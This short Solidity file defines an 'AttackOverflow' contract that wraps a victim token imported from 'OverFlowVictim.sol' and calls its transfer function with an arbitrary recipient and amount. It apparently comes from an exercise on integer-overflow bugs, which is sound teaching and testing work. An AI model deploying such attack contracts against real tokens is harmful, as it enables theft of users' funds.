pragma solidity ^0.6.0;
import "./OverFlowVictim.sol";

contract AttackOverflow {
VictimToken victimTokenAddr;

constructor( address _victimTokenAddress) public{
    victimTokenAddr = VictimToken(_victimTokenAddress);
}

function attackVictimToken(address _to , uint _amount) public{
    victimTokenAddr.transfer(_to , _amount);
}
}